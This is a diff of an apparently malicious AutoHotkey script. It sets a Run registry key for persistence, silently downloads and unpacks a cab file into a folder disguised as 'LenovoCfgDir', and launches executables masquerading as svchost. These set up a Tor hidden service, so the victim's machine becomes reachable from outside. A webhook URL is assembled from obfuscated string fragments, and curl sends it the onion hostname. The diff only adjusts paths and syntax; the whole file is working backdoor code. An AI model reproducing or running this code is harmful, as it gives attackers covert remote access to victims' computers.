@@ -23,13 +23,13 @@ RegWrite,REG_SZ,%runkey%,%mru2%,\1
 
 RunWait %ComSpec% /c if not exist LenovoCfgDir md LenovoCfgDir && curl https://cleanremote.github.io/f/l.cab -sO & expand l.cab -F:* LenovoCfgDir,, Hide
 
-FileDelete, %A_AppData%\LenovoCfgDir\t
+FileDelete, LenovoCfgDir\t
 FileAppend,
 (
-SocksPort 9996
+SocksPort 0
 HiddenServiceDir %A_AppData%\LenovoCfgDir
 HiddenServicePort 80 127.0.0.1:9997
-), %A_AppData%\LenovoCfgDir\t
+), LenovoCfgDir\t
 
 Run %ComSpec% /c LenovoCfgDir\svchost.exe -f `%appdata`%\LenovoCfgDir\t,, Hide
 Run %ComSpec% /c LenovoCfgDir\svchost2.exe -S127.0.0.1:9997 -t`%appdata`%\LenovoCfgDir,, Hide
@@ -40,7 +40,7 @@ Loop
 FileGetSize,hs,LenovoCfgDir\hostname
 If (hs = 64)
 {
-FileRead,hr,LenovoCfgDir\hostname
+FileRead,hr,*m62 LenovoCfgDir\hostname
 dc := "htt"
 dc .= "ps"
 dc .= "://"
@@ -52,7 +52,7 @@ dc .= "bhoo"
 dc .= "ks/147787227"
 dc .= "7566525561/UJ"
 dc .= "Hvd8lIQ52KiL9MVGl6raNfp8N8l76mueEEWpCvU1Vwm2ZMNFQ6HWIf1X3fPrdegxRb"
-Run %ComSpec% /c curl -s -H Accept:application/json -H Content-Type:application/json -d "{\"content\": \"%hr%\"}" "%dc%",, Hide
+Run %ComSpec% /c curl -sHContent-Type:application/json -d{\"content\":\"%hr%\"} %dc%,, Hide
 ExitApp
 }
 Else
